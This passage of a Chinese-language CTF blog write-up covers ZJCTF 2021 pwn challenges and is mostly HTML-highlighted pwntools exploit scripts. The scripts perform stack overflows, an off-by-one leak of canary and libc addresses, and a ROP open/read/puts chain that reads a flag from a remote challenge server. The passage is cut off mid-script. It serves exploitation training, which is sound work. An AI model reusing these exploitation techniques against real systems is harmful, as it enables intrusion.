class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># one_gad = one_gadget(libc.path)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    bss_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x6010E0</span>\n    cat_flag <span class=\"token operator\">=</span> <span class=\"token number\">0x40098E</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'username'</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'password'</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'b'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>cat_flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token string\">''</span>\n\nattack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># p.success(getShell())</span>\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   sai_easy_pwn.py\n@Time    :   2021/10/30 08:55:01\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"easy_stack\"><a class=\"markdownIt-Anchor\" href=\"#easy_stack\">#</a> easy_stack</h1>\n<p>也是栈溢出，不过只能溢出一个字节 read 函数存在 off by one</p>\n<p><img src=\"/CTF/ZJCTF-2021-Pwn/image-20211030131148969.png\" alt=\"image-20211030131148969\"></p>\n<p>调了半天，中途电脑还炸了一次</p>\n<p>栈分布如下，我们直接把数组中存放的地址值覆盖一个字节（改大），让其能泄露出栈上的各种地址</p>\n<p><img src=\"/CTF/ZJCTF-2021-Pwn/image-20211030094313078.png\" alt=\"image-20211030094313078\"></p>\n<p>之后控制 myread 函数在栈上的参数，让其能写到 myread 的栈帧内，因为本题死循环，所以只能写到 myread 的栈帧内</p>\n<p>然后直接写 myread 的返回地址，这里发现 system (/bin/sh) 执行不了，索性使用 orw</p>\n<p>exp</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \n<span class=\"token comment\"># context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./zj_easy_stack'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.31.so'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary,'-g','1234'])</span>\n    <span class=\"token comment\"># p = process(['qemu-aarch64','-L','','-g','1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'89563411-fd49-4df0-a394-13757851c159.zj-ctf.dasctf.com'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'54501'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl64_elf <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x55'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">getShell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token string\">'exec 1>&amp;0'</span><span class=\"token punctuation\">)</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token string\">'echo shell'</span><span class=\"token punctuation\">)</span>\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'shell'</span><span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string\">'Get Shell'</span><span class=\"token punctuation\">)</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token string\">'cat flag'</span><span class=\"token punctuation\">)</span>\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">)</span>\n    flag <span class=\"token operator\">=</span> rl<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'flag'</span> <span class=\"token operator\">+</span> flag<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">exhaust</span><span class=\"token punctuation\">(</span> pwn <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> p\n    i <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            i<span class=\"token operator\">+=</span><span class=\"token number\">1</span>\n            pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            lg<span class=\"token punctuation\">(</span><span class=\"token string\">'times ======== > '</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span>\n            p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>DEBUG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># one_gad = one_gadget(libc.path)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \n    payload <span class=\"token operator\">=</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x100</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\xf0'</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'size'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># dbg()</span>\n    <span class=\"token comment\"># dbg('*$rebase(0x0000000000001488)')</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'sentence'</span> <span class=\"token punctuation\">,</span>  payload<span class=\"token punctuation\">)</span>\n    read_bass <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    stack <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">0x4</span><span class=\"token punctuation\">)</span>\n    canary <span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    leak <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    elf_addr <span class=\"token operator\">=</span> l64_elf<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x137B</span>\n\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'read_bass'</span> <span class=\"token punctuation\">,</span> read_bass<span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack'</span><span class=\"token punctuation\">,</span>stack<span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'canary'</span> <span class=\"token punctuation\">,</span> canary<span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span> <span class=\"token punctuation\">,</span> leak<span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'elf_addr'</span> <span class=\"token punctuation\">,</span> elf_addr<span class=\"token punctuation\">)</span>\n\n    __libc_start_main <span class=\"token operator\">=</span> leak <span class=\"token operator\">-</span> <span class=\"token number\">243</span>\n    libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span>__libc_start_main <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span>\n    pop_rdi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdi;ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    bin_sh <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    system_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\n\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'system_addr'</span> <span class=\"token punctuation\">,</span> system_addr<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># print(canary)</span>\n    \n    arry_stack <span class=\"token operator\">=</span> stack <span class=\"token operator\">-</span> <span class=\"token number\">0x210</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'arry_stack'</span> <span class=\"token punctuation\">,</span> arry_stack<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'size'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span>\n\n    offset <span class=\"token operator\">=</span> <span class=\"token number\">0x100</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>read_bass <span class=\"token operator\">-</span> arry_stack<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'offset'</span><span class=\"token punctuation\">,</span>offset<span class=\"token punctuation\">)</span>\n\n    payload <span class=\"token operator\">=</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>offset <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span> arry_stack <span class=\"token operator\">-</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># dbg('*$rebase(0x0000000000001488)')</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'sentence'</span> <span class=\"token punctuation\">,</span>  payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span> <span class=\"token number\">0x101</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'c'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'size'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span>\n    \n    read_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span>\n    open_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span>\n    puts_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span>\n    ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">' ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rax_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rax; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rdi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdi; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rsi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rsi; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rdx_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdx; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rdx_pop_rbx_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdx ; pop rbx ; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    flag_addr <span class=\"token operator\">=</span> arry_stack <span class=\"token operator\">+</span> <span class=\"token number\">0xf0</span> <span class=\"token operator\">-</span> <span class=\"token number\">8</span>\n    chain <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> pop_rsi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> open_addr<span class=\"token punctuation\">,</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> pop_rsi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> pop_rdx_pop_rbx_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> read_addr<span class=\"token punctuation\">,</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> puts_addr\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'flag\\x00'</span>\n    <span class=\"token comment\"># len chain 0x80</span>\n    \n    <span class=\"token comment\"># dbg('free')</span>\n    <span class=\"token comment\"># dbg('*$rebase(0x00000000000131D)')</span>\n    <span class=\"token comment\"># payload = 'a'*0xb8 + flat(elf_addr + 0x130a , 0 , 0x100 ) + p8( (arry_stack - 0x100 - 0x10)&amp;0xff) + p8((((arry_stack - 8)&amp;0xff00)>>8 ) ) + p64(pop_rdi_ret) + p64(system_addr)</span>\n    payload <span class=\"token operator\">=</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0xb8</span> <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span>elf_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x130a</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x200</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>arry_stack <span class=\"token operator\">-</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xe8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> chain\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'sentence'</span> <span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span> <span class=\"token number\">0x201</span><span class=\"token 